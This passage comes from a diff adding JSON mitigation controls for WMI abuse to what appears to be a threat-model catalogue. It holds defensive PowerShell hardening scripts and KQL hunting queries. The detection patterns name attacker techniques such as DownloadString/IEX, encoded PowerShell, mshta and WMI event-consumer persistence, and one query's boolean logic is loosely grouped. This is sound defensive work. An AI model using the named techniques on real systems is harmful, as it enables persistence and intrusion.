+      "implementation_complexity": "High",
+      "code_example": {
+        "language": "powershell",
+        "framework": "PowerShell + Group Policy",
+        "code": "# WMI Access Control and DCOM Hardening Script\n# Purpose: Restrict WMI permissions and prevent unauthorized remote WMI access\n# Requires: Administrator privileges\n# Author: STRIDE-MCP Security Research\n\n#Requires -RunAsAdministrator\n\nWrite-Host \"======================================\" -ForegroundColor Cyan\nWrite-Host \"WMI Security Hardening Script\" -ForegroundColor Cyan\nWrite-Host \"======================================`n\" -ForegroundColor Cyan\n\n# Function to set WMI namespace security\nfunction Set-WmiNamespaceSecurity {\n    param(\n        [string]$Namespace = \"root/subscription\",\n        [string]$Account = \"BUILTIN\\\\Administrators\",\n        [string]$Permission = \"Enable\", # Enable, MethodExecute, FullWrite, PartialWrite, ProviderWrite, RemoteEnable\n        [switch]$Deny,\n        [switch]$Remove\n    )\n    \n    Write-Host \"[INFO] Modifying WMI namespace security: $Namespace\" -ForegroundColor Cyan\n    Write-Host \"  Account: $Account\" -ForegroundColor Cyan\n    Write-Host \"  Permission: $Permission\" -ForegroundColor Cyan\n    \n    try {\n        # Get WMI namespace security descriptor\n        $security = Get-WmiObject -Namespace $Namespace -Class __SystemSecurity\n        $binarySD = $security.PsBase.InvokeMethod('GetSecurityDescriptor').Descriptor\n        $converter = New-Object System.Management.ManagementClass Win32_SecurityDescriptorHelper\n        $sddl = $converter.BinarySDToSDDL($binarySD)\n        \n        # Parse SDDL and modify\n        $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor($sddl.SDDL)\n        \n        # Define WMI permission constants\n        $WBEM_ENABLE = 1\n        $WBEM_METHOD_EXECUTE = 2\n        $WBEM_FULL_WRITE_REP = 4\n        $WBEM_PARTIAL_WRITE_REP = 8\n        $WBEM_WRITE_PROVIDER = 16\n        $WBEM_REMOTE_ACCESS = 32\n        $READ_CONTROL = 0x20000\n        $WRITE_DAC = 0x40000\n        \n        $permissionValue = switch($Permission) {\n            \"Enable\" { $WBEM_ENABLE }\n            \"MethodExecute\" { $WBEM_METHOD_EXECUTE }\n            \"FullWrite\" { $WBEM_FULL_WRITE_REP }\n            \"PartialWrite\" { $WBEM_PARTIAL_WRITE_REP }\n            \"ProviderWrite\" { $WBEM_WRITE_PROVIDER }\n            \"RemoteEnable\" { $WBEM_REMOTE_ACCESS }\n            default { $WBEM_ENABLE }\n        }\n        \n        # Get account SID\n        $accountObj = New-Object System.Security.Principal.NTAccount($Account)\n        $accountSid = $accountObj.Translate([System.Security.Principal.SecurityIdentifier])\n        \n        if ($Remove) {\n            # Remove ACE for account\n            $sd.DiscretionaryAcl | Where-Object { $_.SecurityIdentifier -eq $accountSid } | ForEach-Object {\n                $sd.DiscretionaryAcl.RemoveAccessSpecific($_.AccessControlType, $_.SecurityIdentifier, $_.AccessMask, $_.InheritanceFlags, $_.PropagationFlags)\n            }\n        } else {\n            # Add or modify ACE\n            $accessType = if ($Deny) { [System.Security.AccessControl.AccessControlType]::Deny } else { [System.Security.AccessControl.AccessControlType]::Allow }\n            $ace = New-Object System.Security.AccessControl.CommonAce($accessType, 0, $permissionValue, $accountSid, $false, $null)\n            $sd.DiscretionaryAcl.InsertAce(0, $ace)\n        }\n        \n        # Convert back to binary and apply\n        $newSDDL = $sd.GetSddlForm([System.Security.AccessControl.AccessControlSections]::All)\n        $binarySD = $converter.SDDLToBinarySD($newSDDL).BinarySD\n        $security.PsBase.InvokeMethod('SetSecurityDescriptor', $binarySD) | Out-Null\n        \n        Write-Host \"[SUCCESS] WMI namespace security updated\" -ForegroundColor Green\n    }\n    catch {\n        Write-Host \"[ERROR] Failed to modify WMI namespace security: $_\" -ForegroundColor Red\n    }\n}\n\n# Harden root\\subscription namespace (critical for persistence)\nWrite-Host \"`n[STEP 1] Hardening root\\\\subscription namespace...\" -ForegroundColor Cyan\n\n# Deny non-admin users from creating event subscriptions\nSet-WmiNamespaceSecurity -Namespace \"root/subscription\" -Account \"BUILTIN\\\\Users\" -Permission \"Enable\" -Deny\nSet-WmiNamespaceSecurity -Namespace \"root/subscription\" -Account \"BUILTIN\\\\Users\" -Permission \"MethodExecute\" -Deny\nSet-WmiNamespaceSecurity -Namespace \"root/subscription\" -Account \"BUILTIN\\\\Users\" -Permission \"FullWrite\" -Deny\n\nWrite-Host \"[SUCCESS] Restricted root\\\\subscription access to Administrators only\" -ForegroundColor Green\n\n# Harden DCOM for remote WMI\nWrite-Host \"`n[STEP 2] Hardening DCOM security for remote WMI...\" -ForegroundColor Cyan\n\n# Set DCOM machine-wide authentication level to \"Packet Privacy\" (encryption)\nSet-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Ole' -Name 'LegacyAuthenticationLevel' -Value 2 -Type DWord\nSet-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Ole' -Name 'LegacyImpersonationLevel' -Value 2 -Type DWord\n\n# Enable DCOM authentication\nSet-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Ole' -Name 'EnableDCOM' -Value 'Y' -Type String\n\nWrite-Host \"[SUCCESS] DCOM hardened with Packet Privacy authentication\" -ForegroundColor Green\n\n# Restrict remote WMI access via Windows Firewall\nWrite-Host \"`n[STEP 3] Configuring Windows Firewall for WMI access control...\" -ForegroundColor Cyan\n\n# Option A: Block all remote WMI (if not needed)\n# Disable-NetFirewallRule -DisplayGroup \"Windows Management Instrumentation (WMI)\"\n# Write-Host \"[SUCCESS] Blocked all remote WMI access via Windows Firewall\" -ForegroundColor Green\n\n# Option B: Restrict remote WMI to specific IP ranges (recommended for enterprise)\n# Modify existing WMI firewall rules to allow only from management subnets\n$managementSubnets = @(\"10.0.1.0/24\", \"192.168.100.0/24\") # Replace with your admin/SIEM subnets\n\nGet-NetFirewallRule -DisplayGroup \"Windows Management Instrumentation (WMI)\" | ForEach-Object {\n    Set-NetFirewallRule -Name $_.Name -RemoteAddress $managementSubnets\n    Write-Host \"  - Updated rule: $($_.DisplayName)\" -ForegroundColor Yellow\n}\n\nWrite-Host \"[SUCCESS] Restricted WMI firewall rules to management subnets: $($managementSubnets -join ', ')\" -ForegroundColor Green\n\n# Disable WMI service on non-server endpoints (optional, aggressive)\n# WARNING: This may break legitimate management tools\n# Write-Host \"`n[STEP 4] Disabling WMI service (OPTIONAL - use with caution)...\" -ForegroundColor Yellow\n# $wmiService = Get-Service -Name Winmgmt\n# if ($wmiService.Status -eq 'Running') {\n#     Stop-Service -Name Winmgmt -Force\n#     Set-Service -Name Winmgmt -StartupType Disabled\n#     Write-Host \"[SUCCESS] WMI service disabled\" -ForegroundColor Green\n# }\n\n# Enable WMI auditing for unauthorized access attempts\nWrite-Host \"`n[STEP 4] Enabling WMI access auditing...\" -ForegroundColor Cyan\n\n# Configure audit policy for object access\nauditpol /set /subcategory:\"Other Object Access Events\" /success:enable /failure:enable\n\nWrite-Host \"[SUCCESS] WMI auditing enabled - check Security log Event ID 4662\" -ForegroundColor Green\n\n# Create scheduled task to monitor WMI event subscriptions\nWrite-Host \"`n[STEP 5] Creating WMI subscription monitoring scheduled task...\" -ForegroundColor Cyan\n\n$monitorScript = @'\n# WMI Subscription Monitor\n$subscriptions = Get-WmiObject -Namespace root\\subscription -Class __EventFilter\nif ($subscriptions.Count -gt 0) {\n    $subscriptions | ForEach-Object {\n        Write-EventLog -LogName Application -Source \"WMI-Monitor\" -EventId 9001 -EntryType Warning -Message \"WMI Event Subscription Detected: Name=$($_.Name), Query=$($_.Query)\"\n    }\n}\n'@\n\n$scriptPath = \"C:\\\\Windows\\\\System32\\\\Monitor-WMISubscriptions.ps1\"\n$monitorScript | Out-File -FilePath $scriptPath -Force\n\n# Create event source if doesn't exist\nif (-not [System.Diagnostics.EventLog]::SourceExists(\"WMI-Monitor\")) {\n    New-EventLog -LogName Application -Source \"WMI-Monitor\"\n}\n\n# Create scheduled task (daily check)\n$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument \"-ExecutionPolicy Bypass -File $scriptPath\"\n$trigger = New-ScheduledTaskTrigger -Daily -At 3am\n$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest\n$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries\n\nRegister-ScheduledTask -TaskName 'WMI Subscription Monitor' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description 'Daily check for unauthorized WMI event subscriptions' -Force | Out-Null\n\nWrite-Host \"[SUCCESS] WMI subscription monitoring scheduled task created\" -ForegroundColor Green\n\n# Deploy via Group Policy (instructions)\nWrite-Host \"`n[INFO] To deploy these settings via Group Policy:\" -ForegroundColor Cyan\nWrite-Host \"  1. Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options\" -ForegroundColor Yellow\nWrite-Host \"     - DCOM: Machine Access Restrictions = Restrict to Administrators\" -ForegroundColor Yellow\nWrite-Host \"     - DCOM: Machine Launch Restrictions = Restrict to Administrators\" -ForegroundColor Yellow\nWrite-Host \"  2. Computer Configuration > Policies > Administrative Templates > Windows Components > WMI\" -ForegroundColor Yellow\nWrite-Host \"     - Establish WMI Namespace Security = Enabled (configure ACLs)\" -ForegroundColor Yellow\nWrite-Host \"  3. Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy\" -ForegroundColor Yellow\nWrite-Host \"     - Object Access > Audit Other Object Access Events = Success and Failure\" -ForegroundColor Yellow\n\nWrite-Host \"`n[SUCCESS] WMI security hardening complete\" -ForegroundColor Green\nWrite-Host \"[INFO] Test remote WMI access to verify changes\" -ForegroundColor Cyan"
+      },
+      "tools": [
+        {
+          "name": "Group Policy Management Console",
+          "type": "Centralized Configuration",
+          "cost": "Free (included in Windows Server)"
+        },
+        {
+          "name": "WMI Administrative Tools",
+          "type": "WMI Permission Management",
+          "cost": "Free (built-in)"
+        },
+        {
+          "name": "Windows Firewall",
+          "type": "Network Access Control",
+          "cost": "Free (built-in)"
+        }
+      ],
+      "iso27001_controls": [
+        "A.9.2.3 - Management of privileged access rights",
+        "A.9.4.1 - Information access restriction",
+        "A.13.1.3 - Segregation in networks",
+        "A.9.1.2 - Access to networks and network services"
+      ],
+      "nist_csf": [
+        "PR.AC-4 - Access permissions and authorizations are managed",
+        "PR.AC-5 - Network integrity is protected",
+        "PR.PT-3 - The principle of least functionality is incorporated",
+        "PR.PT-4 - Communications and control networks are protected"
+      ],
+      "validation_steps": [
+        "Run hardening script with admin privileges: .\\Harden-WMI.ps1",
+        "Test WMI namespace security: As standard user, try: Get-WmiObject -Namespace root\\\\subscription -Class __EventFilter (should fail with Access Denied)",
+        "Test remote WMI block: From another system: Get-WmiObject -Class Win32_OperatingSystem -ComputerName [target] (should fail unless from allowed subnet)",
+        "Verify DCOM settings: Get-ItemProperty 'HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Ole' -Name LegacyAuthenticationLevel (should be 2)",
+        "Check firewall rules: Get-NetFirewallRule -DisplayGroup 'Windows Management Instrumentation (WMI)' | Select-Object DisplayName, RemoteAddress",
+        "Test monitoring task: Run manually: .\\Monitor-WMISubscriptions.ps1, check Application event log for Event ID 9001",
+        "Create test subscription as admin, verify monitoring task detects it"
+      ]
+    },
+    {
+      "control_id": "MIT-003",
+      "title": "Implement PowerShell Constrained Language Mode and Script Block Logging",
+      "description": "Enable PowerShell Constrained Language Mode to restrict PowerShell capabilities, preventing WMI event subscription creation via Set-WmiInstance and New-CimInstance cmdlets. Enable Script Block Logging (Event ID 4104) to capture all PowerShell commands including WMI operations. Combine with PowerShell Transcription for comprehensive audit trail of WMI-based attacks.",
+      "effectiveness": "Medium",
+      "implementation_complexity": "Medium",
+      "code_example": {
+        "language": "powershell",
+        "framework": "PowerShell + Group Policy",
+        "code": "# PowerShell Hardening for WMI Attack Prevention\n# Purpose: Enable Constrained Language Mode and comprehensive logging\n# Requires: Administrator privileges, Windows PowerShell 5.0+\n# Author: STRIDE-MCP Security Research\n\n#Requires -RunAsAdministrator\n\nWrite-Host \"========================================\" -ForegroundColor Cyan\nWrite-Host \"PowerShell Security Hardening for WMI\" -ForegroundColor Cyan\nWrite-Host \"========================================`n\" -ForegroundColor Cyan\n\n# Check PowerShell version\n$psVersion = $PSVersionTable.PSVersion\nif ($psVersion.Major -lt 5) {\n    Write-Host \"[ERROR] PowerShell 5.0 or higher required. Current version: $psVersion\" -ForegroundColor Red\n    exit 1\n}\n\nWrite-Host \"[OK] PowerShell version: $psVersion\" -ForegroundColor Green\n\n# Enable Script Block Logging (captures all PowerShell commands)\nWrite-Host \"`n[STEP 1] Enabling PowerShell Script Block Logging...\" -ForegroundColor Cyan\n\n$scriptBlockPath = 'HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\ScriptBlockLogging'\nif (-not (Test-Path $scriptBlockPath)) {\n    New-Item -Path $scriptBlockPath -Force | Out-Null\n}\n\nSet-ItemProperty -Path $scriptBlockPath -Name 'EnableScriptBlockLogging' -Value 1 -Type DWord\nSet-ItemProperty -Path $scriptBlockPath -Name 'EnableScriptBlockInvocationLogging' -Value 1 -Type DWord\n\nWrite-Host \"[SUCCESS] Script Block Logging enabled - Event ID 4104 in PowerShell Operational log\" -ForegroundColor Green\n\n# Enable PowerShell Module Logging\nWrite-Host \"`n[STEP 2] Enabling PowerShell Module Logging...\" -ForegroundColor Cyan\n\n$moduleLoggingPath = 'HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\ModuleLogging'\nif (-not (Test-Path $moduleLoggingPath)) {\n    New-Item -Path $moduleLoggingPath -Force | Out-Null\n}\n\nSet-ItemProperty -Path $moduleLoggingPath -Name 'EnableModuleLogging' -Value 1 -Type DWord\n\n# Log all modules (especially WMI-related: CimCmdlets, Microsoft.PowerShell.Management)\n$moduleNamesPath = \"$moduleLoggingPath\\\\ModuleNames\"\nif (-not (Test-Path $moduleNamesPath)) {\n    New-Item -Path $moduleNamesPath -Force | Out-Null\n}\n\nSet-ItemProperty -Path $moduleNamesPath -Name '*' -Value '*' -Type String\n\nWrite-Host \"[SUCCESS] Module Logging enabled for all PowerShell modules\" -ForegroundColor Green\n\n# Enable PowerShell Transcription (creates text transcript of all PowerShell sessions)\nWrite-Host \"`n[STEP 3] Enabling PowerShell Transcription...\" -ForegroundColor Cyan\n\n$transcriptionPath = 'HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\Transcription'\nif (-not (Test-Path $transcriptionPath)) {\n    New-Item -Path $transcriptionPath -Force | Out-Null\n}\n\nSet-ItemProperty -Path $transcriptionPath -Name 'EnableTranscripting' -Value 1 -Type DWord\nSet-ItemProperty -Path $transcriptionPath -Name 'EnableInvocationHeader' -Value 1 -Type DWord\n\n# Set transcript output directory (ensure proper ACLs to prevent attacker deletion)\n$transcriptDir = 'C:\\\\PSTranscripts'\nif (-not (Test-Path $transcriptDir)) {\n    New-Item -Path $transcriptDir -ItemType Directory -Force | Out-Null\n}\n\nSet-ItemProperty -Path $transcriptionPath -Name 'OutputDirectory' -Value $transcriptDir -Type String\n\n# Secure transcript directory (only SYSTEM and Administrators can access)\n$acl = Get-Acl $transcriptDir\n$acl.SetAccessRuleProtection($true, $false) # Disable inheritance\n\n# Add SYSTEM Full Control\n$systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\n    'SYSTEM', 'FullControl', 'ContainerInherit,ObjectInherit', 'None', 'Allow'\n)\n$acl.AddAccessRule($systemRule)\n\n# Add Administrators Full Control\n$adminsRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\n    'BUILTIN\\\\Administrators', 'FullControl', 'ContainerInherit,ObjectInherit', 'None', 'Allow'\n)\n$acl.AddAccessRule($adminsRule)\n\nSet-Acl -Path $transcriptDir -AclObject $acl\n\nWrite-Host \"[SUCCESS] Transcription enabled - logs saved to: $transcriptDir\" -ForegroundColor Green\n\n# Enable Constrained Language Mode via AppLocker (most effective method)\nWrite-Host \"`n[STEP 4] Configuring Constrained Language Mode via AppLocker...\" -ForegroundColor Cyan\n\n# Check if AppLocker service is available\n$appIdService = Get-Service -Name AppIDSvc -ErrorAction SilentlyContinue\nif ($appIdService) {\n    Set-Service -Name AppIDSvc -StartupType Automatic\n    Start-Service -Name AppIDSvc -ErrorAction SilentlyContinue\n    \n    Write-Host \"[INFO] AppLocker service enabled\" -ForegroundColor Cyan\n    Write-Host \"[INFO] Deploy AppLocker policy via Group Policy to enforce Constrained Language Mode\" -ForegroundColor Yellow\n    Write-Host \"       - Constrained Language Mode blocks: New-Object, Add-Type, Set-WmiInstance, Invoke-Expression\" -ForegroundColor Yellow\n    Write-Host \"       - This prevents most PowerShell-based WMI persistence techniques\" -ForegroundColor Yellow\n} else {\n    Write-Host \"[WARNING] AppLocker not available (requires Windows Enterprise/Education edition)\" -ForegroundColor Yellow\n}\n\n# Alternative: Environment variable method (less secure, easily bypassed)\n# [System.Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')\n# Write-Host \"[INFO] Constrained Language Mode set via environment variable (reboot required)\" -ForegroundColor Yellow\n\n# Configure Protected Event Logging (encrypts sensitive data in logs)\nWrite-Host \"`n[STEP 5] Configuring PowerShell Protected Event Logging...\" -ForegroundColor Cyan\n\n# Protected Event Logging requires certificate for encryption\n# Placeholder - implement certificate-based encryption for sensitive environments\nWrite-Host \"[INFO] Protected Event Logging requires PKI certificate configuration\" -ForegroundColor Yellow\nWrite-Host \"       See: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows\" -ForegroundColor Yellow\n\n# Increase PowerShell log sizes\nWrite-Host \"`n[STEP 6] Increasing PowerShell event log sizes...\" -ForegroundColor Cyan\n\n$psLogNames = @(\n    'Microsoft-Windows-PowerShell/Operational',\n    'Windows PowerShell'\n)\n\nforeach ($logName in $psLogNames) {\n    try {\n        $log = New-Object System.Diagnostics.Eventing.Reader.EventLogConfiguration $logName\n        $log.MaximumSizeInBytes = 1GB\n        $log.SaveChanges()\n        Write-Host \"  - Increased log size: $logName (1 GB)\" -ForegroundColor Green\n    } catch {\n        Write-Host \"  - Failed to configure log: $logName\" -ForegroundColor Red\n    }\n}\n\n# Create detection rule for WMI-related PowerShell commands\nWrite-Host \"`n[STEP 7] Creating sample detection query for WMI PowerShell abuse...\" -ForegroundColor Cyan\n\n$detectionQuery = @'\n# PowerShell Script Block Logging - WMI Persistence Detection\n# Run this query in your SIEM or locally via Get-WinEvent\n\nGet-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[EventID=4104]]' |\n    Where-Object {\n        $_.Message -match '__EventFilter' -or\n        $_.Message -match '__EventConsumer' -or\n        $_.Message -match '__FilterToConsumerBinding' -or\n        $_.Message -match 'CommandLineEventConsumer' -or\n        $_.Message -match 'ActiveScriptEventConsumer' -or\n        $_.Message -match 'Set-WmiInstance.*root\\\\subscription' -or\n        $_.Message -match 'New-CimInstance.*root/subscription' -or\n        $_.Message -match 'Invoke-WmiMethod.*Win32_Process.*Create' -or\n        $_.Message -match 'Get-WmiObject.*-ComputerName'\n    } |\n    Select-Object TimeCreated, @{Name='User';Expression={$_.UserId}}, Message |\n    Format-Table -AutoSize\n'@\n\n$queryPath = \"$env:USERPROFILE\\\\Desktop\\\\Detect-WMI-PowerShell.ps1\"\n$detectionQuery | Out-File -FilePath $queryPath -Force\n\nWrite-Host \"[SUCCESS] Detection query saved to: $queryPath\" -ForegroundColor Green\n\n# Summary and validation\nWrite-Host \"`n========================================\" -ForegroundColor Cyan\nWrite-Host \"PowerShell Hardening Complete\" -ForegroundColor Green\nWrite-Host \"========================================\" -ForegroundColor Cyan\n\nWrite-Host \"`n[ENABLED FEATURES]\" -ForegroundColor Cyan\nWrite-Host \"  ✓ Script Block Logging (Event ID 4104)\" -ForegroundColor Green\nWrite-Host \"  ✓ Module Logging (all modules)\" -ForegroundColor Green\nWrite-Host \"  ✓ Transcription (output: $transcriptDir)\" -ForegroundColor Green\nWrite-Host \"  ✓ Event log sizes increased (1 GB)\" -ForegroundColor Green\n\nWrite-Host \"`n[NEXT STEPS]\" -ForegroundColor Cyan\nWrite-Host \"  1. Deploy via Group Policy for enterprise-wide enforcement\" -ForegroundColor Yellow\nWrite-Host \"     - Computer Configuration > Policies > Administrative Templates > Windows Components > Windows PowerShell\" -ForegroundColor Yellow\nWrite-Host \"  2. Configure AppLocker to enable Constrained Language Mode\" -ForegroundColor Yellow\nWrite-Host \"  3. Forward PowerShell logs to SIEM (Event IDs 4103, 4104, 4105, 4106)\" -ForegroundColor Yellow\nWrite-Host \"  4. Test detection: Run detection query script on Desktop\" -ForegroundColor Yellow\nWrite-Host \"  5. Create test WMI subscription and verify it's logged\" -ForegroundColor Yellow\n\nWrite-Host \"`n[INFO] Restart PowerShell session for changes to take effect\" -ForegroundColor Cyan"
+      },
+      "tools": [
+        {
+          "name": "PowerShell",
+          "type": "Scripting Engine with Security Features",
+          "cost": "Free (included in Windows)"
+        },
+        {
+          "name": "AppLocker",
+          "type": "Application Whitelisting for Constrained Language Mode",
+          "cost": "Free (Windows Enterprise/Education)"
+        },
+        {
+          "name": "Group Policy",
+          "type": "Centralized PowerShell Configuration",
+          "cost": "Free (Windows Server)"
+        }
+      ],
+      "iso27001_controls": [
+        "A.12.4.1 - Event logging",
+        "A.12.4.3 - Administrator and operator logs",
+        "A.12.6.1 - Management of technical vulnerabilities"
+      ],
+      "nist_csf": [
+        "PR.PT-1 - Audit/log records are determined",
+        "DE.AE-3 - Event data are collected and correlated",
+        "DE.CM-7 - Monitoring for unauthorized activity"
+      ],
+      "validation_steps": [
+        "Run PowerShell hardening script: .\\Harden-PowerShell.ps1",
+        "Verify Script Block Logging: Get-ItemProperty 'HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\ScriptBlockLogging' -Name EnableScriptBlockLogging",
+        "Test logging: Run: Get-WmiObject -Class Win32_OperatingSystem",
+        "Check logs: Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[EventID=4104]]' -MaxEvents 5",
+        "Verify transcript created: dir C:\\\\PSTranscripts (should contain .txt files)",
+        "Test Constrained Language Mode (if AppLocker enabled): $ExecutionContext.SessionState.LanguageMode (should show 'ConstrainedLanguage')",
+        "Attempt WMI persistence in constrained mode: Set-WmiInstance -Namespace root\\\\subscription -Class __EventFilter ... (should fail)",
+        "Run detection query script to find WMI-related PowerShell activity"
+      ]
+    },
+    {
+      "control_id": "MIT-004",
+      "title": "Deploy EDR with WMI Behavioral Detection and Automated Response",
+      "description": "Implement Endpoint Detection and Response (EDR) solution with behavioral analytics specifically tuned for WMI abuse detection. Configure automated response actions to quarantine systems exhibiting WMI persistence creation, remote WMI execution patterns, or WMI-based lateral movement. Leverage EDR telemetry for threat hunting WMI event subscriptions across enterprise.",
+      "effectiveness": "High",
+      "implementation_complexity": "Medium",
+      "code_example": {
+        "language": "kusto",
+        "framework": "Microsoft Defender for Endpoint (KQL)",
+        "code": "// Microsoft Defender for Endpoint - WMI Persistence Detection Queries\n// Author: STRIDE-MCP Security Research\n// Purpose: Detect WMI event subscriptions, remote execution, and lateral movement\n\n// Query 1: WMI Event Subscription Creation (Persistence)\nDeviceEvents\n| where ActionType in (\"WmiBindingEventConsumerToFilter\", \"WmiEventConsumerCreation\", \"WmiEventFilterCreation\")\n| extend ConsumerName = tostring(parse_json(AdditionalFields).ConsumerName)\n| extend FilterName = tostring(parse_json(AdditionalFields).FilterName)\n| extend Query = tostring(parse_json(AdditionalFields).Query)\n| extend ConsumerType = tostring(parse_json(AdditionalFields).ConsumerType)\n| extend CommandLineTemplate = tostring(parse_json(AdditionalFields).CommandLineTemplate)\n| extend ScriptText = tostring(parse_json(AdditionalFields).ScriptText)\n// Flag suspicious indicators\n| extend IsSuspicious = \n    ConsumerName !startswith \"Microsoft\" and\n    ConsumerName !startswith \"Windows\" and\n    (\n        CommandLineTemplate contains \"powershell\" or\n        CommandLineTemplate contains \"cmd.exe\" or\n        CommandLineTemplate contains \"http\" or\n        CommandLineTemplate contains \"mshta\" or\n        CommandLineTemplate contains \"rundll32\" or\n        CommandLineTemplate contains \"-enc\" or\n        CommandLineTemplate contains \"-EncodedCommand\" or\n        ScriptText contains \"DownloadString\" or\n        ScriptText contains \"Invoke-Expression\" or\n        ScriptText contains \"IEX\" or\n        Query contains \"__InstanceModificationEvent\" or\n        Query contains \"Win32_LocalTime\" or\n        Query contains \"Win32_PerfFormattedData\"\n    )\n| where IsSuspicious == true\n| project Timestamp, DeviceName, AccountName, ActionType, ConsumerName, FilterName, Query, CommandLineTemplate, ScriptText, ConsumerType\n| order by Timestamp desc\n\n\n// Query 2: WMI Remote Execution and Lateral Movement\nDeviceProcessEvents\n| where FileName =~ \"wmic.exe\" or\n        FileName =~ \"WmiPrvSE.exe\" or\n        FileName =~ \"scrcons.exe\"\n// Detect remote WMI execution patterns\n| extend IsRemoteWMI = \n    ProcessCommandLine contains \"/node:\" or\n    ProcessCommandLine contains \"/NODE:\" or\n    ProcessCommandLine contains \"-ComputerName\" or\n    ProcessCommandLine contains \"Win32_Process\" or\n    ProcessCommandLine contains \"process call create\"\n| extend IsSuspiciousParent = \n    InitiatingProcessFileName =~ \"WmiPrvSE.exe\" or\n    InitiatingProcessFileName =~ \"scrcons.exe\"\n| extend IsSuspiciousChild =\n    FileName in~ (\"powershell.exe\", \"cmd.exe\", \"mshta.exe\", \"rundll32.exe\", \"regsvr32.exe\", \"wscript.exe\", \"cscript.exe\")\n| where IsRemoteWMI == true or\n        IsSuspiciousParent == true or\n        (InitiatingProcessFileName =~ \"WmiPrvSE.exe\" and IsSuspiciousChild == true)\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName\n| order by Timestamp desc\n\n\n// Query 3: WMI Network Connections (Remote Access)\nDeviceNetworkEvents\n| where InitiatingProcessFileName =~ \"WmiPrvSE.exe\" or\n        InitiatingProcessFileName =~ \"Winmgmt.exe\"\n| where RemotePort in (135, 5985, 5986) or\n        (RemotePort >= 49152 and RemotePort <= 65535) // Dynamic RPC ports\n| extend IsOutbound = RemoteIPType == \"Public\" or RemoteIPType == \"External\"\n| extend IsLateralMovement = \n    RemoteIPType == \"Private\" and\n    RemoteIP startswith \"10.\" or RemoteIP startswith \"172.\" or RemoteIP startswith \"192.168.\"\n| where IsOutbound == true or IsLateralMovement == true\n| project Timestamp, DeviceName, InitiatingProcessAccountName, RemoteIP, RemotePort, RemoteUrl, ActionType, InitiatingProcessCommandLine\n| order by Timestamp desc\n\n\n// Query 4: Detect MOF File Compilation (Advanced Persistence)\nDeviceProcessEvents\n| where FileName =~ \"mofcomp.exe\"\n| extend IsSuspiciousMOF = \n    ProcessCommandLine contains \".mof\" and\n    (\n        ProcessCommandLine !contains \"C:\\\\Windows\\\\System32\" or\n        ProcessCommandLine contains \"subscription\" or\n        ProcessCommandLine contains \"__EventFilter\" or\n        ProcessCommandLine contains \"__EventConsumer\"\n    )\n| where IsSuspiciousMOF == true\n| join kind=inner (\n    DeviceFileEvents\n    | where FileName endswith \".mof\"\n    | where FolderPath !startswith \"C:\\\\Windows\\\\System32\"\n) on DeviceId\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath, FileName, FileSize, SHA256\n| order by Timestamp desc\n\n\n// Query 5: Hunt for existing WMI persistence across estate\n// Note: This query uses custom detection - adapt for your EDR platform\nDeviceEvents\n| where ActionType == \"WmiEventConsumerCreation\"\n| summarize \n    FirstSeen = min(Timestamp),\n    LastSeen = max(Timestamp),\n    DeviceCount = dcount(DeviceName),\n    Devices = make_set(DeviceName)\n    by ConsumerName = tostring(parse_json(AdditionalFields).ConsumerName),\n       ConsumerType = tostring(parse_json(AdditionalFields).ConsumerType),\n       CommandLineTemplate = tostring(parse_json(AdditionalFields).CommandLineTemplate)\n| where DeviceCount >= 3 // Flag subscriptions on multiple devices (potential malware spread)\n| order by DeviceCount desc\n\n\n// Query 6: PowerShell WMI abuse correlation\nDeviceEvents\n| where ActionType in (\"WmiEventConsumerCreation\", \"WmiEventFilterCreation\", \"WmiBindingEventConsumerToFilter\")\n| project Timestamp, DeviceId, DeviceName, AccountName, WmiActionType = ActionType, ConsumerName = tostring(parse_json(AdditionalFields).ConsumerName)\n| join kind=inner (\n    DeviceEvents\n    | where ActionType == \"PowerShellCommand\"\n    | where AdditionalFields contains \"Set-WmiInstance\" or\n            AdditionalFields contains \"New-CimInstance\" or\n            AdditionalFields contains \"__EventFilter\" or\n            AdditionalFields contains \"root\\\\subscription\"\n    | project Timestamp1 = Timestamp, DeviceId, PowerShellCommand = tostring(parse_json(AdditionalFields).Command)\n) on DeviceId\n| where abs(datetime_diff('minute', Timestamp, Timestamp1)) <= 5 // WMI creation within 5 min of PowerShell command\n| project Timestamp, DeviceName, AccountName, WmiActionType, ConsumerName, PowerShellCommand\n| order by Timestamp desc\n\n\n// Automated Response Configuration (Microsoft Defender for Endpoint)\n// Create Custom Detection Rule:\n// 1. Navigate to: Settings > Endpoints > Rules > Custom Detection Rules\n// 2. Create new rule with Query 1 or Query 2 above\n// 3. Configure automated response actions:\n//    - Isolate machine (for critical systems)\n//    - Collect investigation package\n//    - Run antivirus scan\n//    - Initiate automated investigation\n//    - Send email alert to SOC\n// 4. Set severity: High\n// 5. Set MITRE ATT&CK mapping: T1546.003, T1047, T1021.006\n\n\n// Alternative EDR Platforms - Pseudo-queries:\n\n/*\n// CrowdStrike Falcon (Splunk-style query)\nindex=crowdstrike 